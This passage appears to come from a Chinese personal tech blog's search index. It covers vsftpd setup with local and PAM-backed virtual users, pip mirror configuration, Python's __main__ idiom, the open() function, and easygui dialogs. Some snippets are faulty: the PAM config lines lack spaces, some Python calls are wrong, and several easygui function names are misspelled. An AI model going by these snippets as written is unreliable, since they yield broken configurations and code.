开启 PAM 认证，配置文件路径为/etc/pam.d/vsftpd.vu（默认有该行配置，但文件名为vsftpd）<br>virtual_use_local_privs=yes#  使虚拟用户跟本地用户权限相同（配置此行后需使用用户的参数来配置虚拟用户）<br><br>#  用户相关配置<br>local_root=/test#  指定用户访问目录<br>local_umask=022#  设置用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）<br>local_max_rate=30000#  用户限速为 30k/s<br></code></pre></td></tr></table></figure><hr><h2 id="三、配置本地用户访问"><a href="#三、配置本地用户访问" class="headerlink" title="三、配置本地用户访问"></a>三、配置本地用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">local_root=/test<br></code></pre></td></tr></table></figure><h3 id="2、创建用户"><a href="#2、创建用户" class="headerlink" title="2、创建用户"></a>2、创建用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">useradd test    #  新建 test 用户<br>passwd test     #  设置密码（此处需确认密码）<br></code></pre></td></tr></table></figure><h3 id="3、创建目录"><a href="#3、创建目录" class="headerlink" title="3、创建目录"></a>3、创建目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mkdir /test         #  创建目录<br>chmod 755 /test     #  设置目录权限<br>chown test:test /test   #  设置该目录所属用户跟组<br></code></pre></td></tr></table></figure><p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p><h3 id="4、登陆测试"><a href="#4、登陆测试" class="headerlink" title="4、登陆测试"></a>4、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  使用命令连接登陆测试<br>ftp 192.168.1.123<br></code></pre></td></tr></table></figure><hr><h2 id="四、配置虚拟用户访问"><a href="#四、配置虚拟用户访问" class="headerlink" title="四、配置虚拟用户访问"></a>四、配置虚拟用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">user_config_dir=/etc/vsftpd/user_conf#  指定用户配置文件目录（配置文件需为对应的用户名）<br>guest_enable=yes    #  开启用户身份映射（允许虚拟用户登陆）<br>guest_username=virtftp#  设置映射的用户身份为 virtftp（virtftp 为真实用户）<br>pam_service_name=vsftpd.vu#  开启 PAM 认证，配置文件路径为/etc/pam.d/vsftpd.vu（需注释掉原有的行，并复制原文件另存为 vsftpd.vu）<br>allow_writeable_chroot=yes#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）<br></code></pre></td></tr></table></figure><h3 id="2、创建映射的账号并设置虚拟用户的账号跟密码"><a href="#2、创建映射的账号并设置虚拟用户的账号跟密码" class="headerlink" title="2、创建映射的账号并设置虚拟用户的账号跟密码"></a>2、创建映射的账号并设置虚拟用户的账号跟密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  创建虚拟用户映射的用户（该用户不可登陆）<br>useradd -s /sbin/nologin virtftp<br><br>#  创建存放用户名跟密码的文件<br>touch ftpuser.txt<br></code></pre></td></tr></table></figure><p><code>ftpuser.txt</code> 文件内容如下（单数行为用户名，双数行为密码）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ftpadmin<br>admin<br>ftpuser<br>admin<br></code></pre></td></tr></table></figure><p>由于保存虚拟用户跟密码的文本无法被直接调用，所以需生成数据库文件：<br><code>db_load -T -t hash -f ftpuser.txt ftpuser.db</code></p><h3 id="3、创建用户配置文件"><a href="#3、创建用户配置文件" class="headerlink" title="3、创建用户配置文件"></a>3、创建用户配置文件</h3><p>创建虚拟用户的配置目录及其配置文件：<br><code>mkdir /etc/vsftpd/user_conf</code><br><code>touch /etc/vsftpd/user_conf/ftpadmin</code><br><code>touch /etc/vsftpd/user_conf/ftpuser</code></p><p>ftpadmin 配置内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">anon_upload_enable=yes<br>anon_mkdir_write_enable=yes<br>anon_other_write_enable=yes<br>anon_umask=022<br></code></pre></td></tr></table></figure><p>ftpuser 配置内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">anon_upload_enable=yes<br></code></pre></td></tr></table></figure><h3 id="4、配置-PAM-认证"><a href="#4、配置-PAM-认证" class="headerlink" title="4、配置 PAM 认证"></a>4、配置 PAM 认证</h3><p>根据 vsftpd.conf 配置将 PAM 认证文件名更改为对应的名称：<br><code>mv /etc/pam.d/vsftpd /etc/pam.d/vsftpd.vu</code></p><p>注释 <code>vsftpd.vu</code> 文件内所有行，并在文件末尾添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  此处末尾的路径为虚拟用户账号跟密码文件所在的绝对路径（无需后缀名）<br>authrequiredpam_userdb.sodb=/etc/vsftpd/ftpuser<br>accountrequiredpam_userdb.sodb=/etc/vsftpd/ftpuser<br></code></pre></td></tr></table></figure><p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p><h3 id="5、登陆测试"><a href="#5、登陆测试" class="headerlink" title="5、登陆测试"></a>5、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  使用命令连接登陆测试<br>ftp 192.168.1.123#  如服务重启无报错，登陆失败则可能是 PAM 配置文件的问题<br></code></pre></td></tr></table></figure><hr><h2 id="五、PAM-配置文件简介"><a href="#五、PAM-配置文件简介" class="headerlink" title="五、PAM 配置文件简介"></a>五、PAM 配置文件简介</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">服务器名称    模块类型    控制方式    模块路径    模块参数<br></code></pre></td></tr></table></figure><h3 id="服务器名称："><a href="#服务器名称：" class="headerlink" title="服务器名称："></a>服务器名称：</h3><p>设置服务器名称时字母需小写</p><h3 id="模块类型："><a href="#模块类型：" class="headerlink" title="模块类型："></a>模块类型：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auth        #  接受用户名和密码，进而对该用户的密码进行认证，并负责设置用户的一些秘密信息。<br>account     #  检查帐户是否被允许登录系统，帐号是否已经过期，帐号的登录是否有时间段的限制等等。<br>password    #  用来修改用户的密码，检测修改密码动作是否被允许以及新密码是否符合要求等。<br>session     #  提供对会话的管理和记账。<br></code></pre></td></tr></table></figure><h3 id="控制方式："><a href="#控制方式：" class="headerlink" title="控制方式："></a>控制方式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">required    #  表示本模块必须返回成功才能通过认证，但是如果该模块返回失败的话，失败结果也不会立即通知用户，而是要等到同一 stack 中的所有模块全部执行完毕再将失败结果返回给应用程序。可以认为是一个必要条件。<br>requisite   #  与required类似，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一 stack 内的任何模块，而是直 接将控制权返回给应用程序。是一个必要条件。<br>sufficient  #  表明本模块返回成功已经足以通过身份认证的要求，不必再执行同一 stack 内的其它模块，但是如果本模块返回失败的话可以忽略。可以认为是一个充分条件。<br>optional    #  表明本模块是可选的，它的成功与否一般不会对身份认证起关键作用，其返回值一般被忽略。<br>include     #  将认证权利移交给其他文件。<br></code></pre></td></tr></table></figure><h3 id="模块路径："><a href="#模块路径：" class="headerlink" title="模块路径："></a>模块路径：</h3><p>设置模块路径（需绝对路径）</p><h3 id="模块参数："><a href="#模块参数：" class="headerlink" title="模块参数："></a>模块参数：</h3><p>传递给改模块的参数</p>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip 更换源</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/pip/pip/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/pip/pip/</url>
      
        <content type="html"><![CDATA[<h2 id="pip-更换成国内源"><a href="#pip-更换成国内源" class="headerlink" title="pip 更换成国内源"></a>pip 更换成国内源</h2><p>在 <code>C:\Users\【用户名】\AppData\Roaming</code> 目录下新建 <code>pip</code> 文件夹，然后在文件夹内新建 <code>pip.ini</code> 文件</p><p>文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[global]<br>timeout = 60000<br>index-url = https://pypi.tuna.tsinghua.edu.cn/simple<br>[install]<br>use-mirrors = true<br>mirrors = https://pypi.tuna.tsinghua.edu.cn<br></code></pre></td></tr></table></figure><h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  阿里云<br>http://mirrors.aliyun.com/pypi/simple/<br>#  中国科技大学<br>https://pypi.mirrors.ustc.edu.cn/simple/<br>#  豆瓣(douban)<br>http://pypi.douban.com/simple/<br>#  清华大学<br>https://pypi.tuna.tsinghua.edu.cn/simple/<br>#  中国科学技术大学<br>http://pypi.mirrors.ustc.edu.cn/simple/<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>if __name__ = &#39;__main__&#39;</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%87%BD%E6%95%B0/if__name__=&#39;__main__&#39;/if__name__=&#39;__main__&#39;/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%87%BD%E6%95%B0/if__name__=&#39;__main__&#39;/if__name__=&#39;__main__&#39;/</url>
      
        <content type="html"><![CDATA[<h2 id="if-name-‘-main-‘"><a href="#if-name-‘-main-‘" class="headerlink" title="if __name__ &#x3D;&#x3D; ‘__main__‘"></a>if __name__ &#x3D;&#x3D; ‘__main__‘</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if __name__ == &#x27;__main__&#x27;:<br>    def_test()<br></code></pre></td></tr></table></figure><p>程序的入口，当函数被调用时会从此处开始运行</p><ul><li>如被导入的模块内没写 <code>if __name__ == &#39;__main__&#39;</code>，则会在模块被导入后自动运行该模块下的函数</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Open 函数</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%87%BD%E6%95%B0/open%E5%87%BD%E6%95%B0/open%20%E5%87%BD%E6%95%B0/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%87%BD%E6%95%B0/open%E5%87%BD%E6%95%B0/open%20%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>open 函数用于打开文件，创建一个文件对象。</p><table><thead><tr><th align="center">编码</th><th align="center">占位</th></tr></thead><tbody><tr><td align="center">UTF-16</td><td align="center">一个英文字母或一个汉字字符占两个字节</td></tr><tr><td align="center">UTF-8</td><td align="center">一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节。</td></tr><tr><td align="center">Unicode编码</td><td align="center">一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。</td></tr></tbody></table><h2 id="二、实例："><a href="#二、实例：" class="headerlink" title="二、实例："></a>二、实例：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f = open (&quot;c:\\123.txt&quot;, &quot;rt&quot;)<br>f.close()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  以只读的文本格式打开 C 盘下的 123.txt 文件并复制给 </p><ul><li>文件使用完后使用 close 关闭文件</li></ul><table><thead><tr><th align="center">参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">r</td><td align="center">以只读模式打开文件（默认）</td></tr><tr><td align="center">w</td><td align="center">以写入的方式打开文件，会覆盖已存在的文件</td></tr><tr><td align="center">x</td><td align="center">如果文件已经存在，使用此模式打开将引发异常</td></tr><tr><td align="center">a</td><td align="center">以写入模式打开，如果文件存在，则在末尾追加写入</td></tr><tr><td align="center">b</td><td align="center">以二进制模式打开文件</td></tr><tr><td align="center">t</td><td align="center">以文本模式打开（默认）</td></tr></tbody></table><ul><li>| 可读写模式（可添加到其他模式种使用）<br>U | 通用换行符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">with opened(r&#x27;d:\\xxx.txt&#x27;) as fp:<br>    for line in fp.readlines():<br>        print line<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F; with 中的代码块在执行的过程中无论发生什么异常，里面的文件最终都会被关闭。</p><h2 id="三、常用函数："><a href="#三、常用函数：" class="headerlink" title="三、常用函数："></a>三、常用函数：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.write(&#x27;\nabc&#x27;)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  插入换行跟字符abc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.writelines(n)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  n为列表，元组等，n内容的类型必须为str，把n的那类容插入到f</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.close()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  关闭文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.read(6)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  读取6个字符，包括换行符（默认读取整个文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.readline(6)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  读取第一行前6个字符（默认读取第一行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.readlines()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  读取整个文件返回一个列表，列表每个元素代表一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.seek(offfset, from)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  offset：偏移量 （字节）<br>&emsp;&#x2F;&#x2F;  from：0-文件开头，1-当前位置，2-文件末尾（默认为0）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.seek(6)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  指针移动到第6个字符的位置，从第7个字节开始打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.seek(3, 0)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  从起始位置向后偏移3字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.seek(3, 1)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  从当前位置向后偏移3字节（需加权限b（二进制模式打开））</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.seek(-3, 2)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  从末尾位置向前偏移3字节（需加权限b（二进制模式打开））</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f.tell()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  返回当前在文件中的位置</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easygui 库</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/EasyGui%E5%BA%93/easygui%E5%BA%93/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/EasyGui%E5%BA%93/easygui%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>EasyGUI 是一个用 Python 编写的非常简易的 GUI 编程模块</p><h2 id="二、实例："><a href="#二、实例：" class="headerlink" title="二、实例："></a>二、实例：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">easygui.msgbox(&#x27;123&#x27;)<br>easygui.msgbox(msg=&#x27;123&#x27;, title=&#x27;456&#x27;, ok_button=&#x27;456&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a = [&#x27;123&#x27;, &#x27;456&#x27;, &#x27;789&#x27;]<br>easygui.choices(msg=&#x27;123&#x27;, title=&#x27;456&#x27;, choices = a)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">easygui.choicex(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, choicex=(&#x27;123&#x27;, &#x27;456&#x27;, &#x27;789&#x27;))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">easygui.ccbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, choicex=(&#x27;确定&#x27;, &#x27;取消&#x27;）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">easygui.buttonbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, choices=(&#x27;123&#x27;, &#x27;456&#x27;, &#x27;789&#x27;))<br><br>easygui.buttonbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, choices=(&#x27;123&#x27;, &#x27;456&#x27;, &#x27;789&#x27;), img=&#x27;test.png&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">easygui.enterbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, strip=True, image=&#x27;test.gif&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g.passwordbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, image=&#x27;test.gif&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g.multpasswordbox(msg=&#x27;123&#x27;, title=&quot;456&quot;, fields=(&quot;用户名&quot;, &#x27;密码&#x27;), values=&#x27;1&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g.integerbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, lowerbound=&#x27;0&#x27;, upperbound=&#x27;99&#x27;, image=&#x27;test.gif&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g.multenterbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, fields=(&#x27;123&#x27;, &#x27;456&#x27;, &#x27;789&#x27;), values=(&#x27;123&#x27;, &#x27;456&#x27;))<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  fields为每行的名字，values为在第一处插入字符123，第二处插入字符456</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g.textbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, codebox=False)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g.diropenbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, default=&#x27;c:\\&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g.fileopenbox(msg=&#x27;1&#x27;, title=&#x27;2&#x27;, default=&#x27;c:\\&#x27;, filetypes=[&#x27;*.txt&#x27;], multiple=True)<br></code></pre></td></tr></table></figure><hr><h2 id="三、常用函数："><a href="#三、常用函数：" class="headerlink" title="三、常用函数："></a>三、常用函数：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msgbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  消息框</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">choicebox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  单项选择框（必须选择一个选项）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mutchoicebox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  多项选择框（可以选择0个，1个或者同时选择多个选项)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ccbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  弹出一个  Continue &#x2F; Cancel  对话框（只有两个按钮）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ynbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  跟 ccobx 功能一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">boolbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  跟 ccbox 格式类似，但是当第一个按钮被点击时返回1，否则返回0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">buttombox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  可以定义一组自己的按钮，当用户点击任意一个按钮时，则返回按钮的文本内容。当用户点击取消或者关闭窗口时，则返回默认选项（第一个选项）。可插入 gif &#x2F; png 图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">indexbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  跟 buttombox 格式类似，但是点击按钮时返回的是序号（第一个按钮返回0，第二个返回1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">enterbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  提供一个最简单的输入框 strip&#x3D;True 时会自动去除首尾的空格，如需保留首尾的空格，则设置为 strip&#x3D;False</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">passwordbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  跟 enterbox 格式类似，不同的是用户输入的内容用 * 显示出来，返回用户输入的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">multpasswordbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  跟 multenterbox 格式类似，但最后一行输入框显示为密码的形式（ * ）<br>    • fields参数设置每行的名字<br>    • values参数在第一行（此处为第一行）处插入预先设置的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">interbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  为用户提供一个简单的输入框，用户只能输入范围内<br>    • lowerbound参数设置最小值，upperbound参数设置最大值的整型数值，否则会要求用户重新输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mulenterbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  为用户提供多个简单的输入框，需注意以下几点：<br>    • 如果用户输入的值比选项少的话，则返回列表中的值用空字符串填充用户为输入的选项。<br>    • 如果用户输入的值比选项多的话，则返回的列表中的值将截断为选项的数量。<br>    • 如果用户取消操作，则返回域中的列表的值或者None值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">textbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  文本（codebox值为False时，设置为等宽字体（会自动换行））</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">diropenbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  提供一个对话框，返回用户选择的目录名，该目录名带有完整的路径<br>    • default参数用于设置默认的打开目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fileopenbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  提供一个对话框，返回用户选择的文件名，该文件名带有完整的路径<br>    • default参数用于设置默认的打开目录<br>    • filetypes参数用于设置包含文件的类型<br>    • multiple参数为True时，则可以多选</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">exceptionbox<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  捕获异常</p>]]></content>
      
      
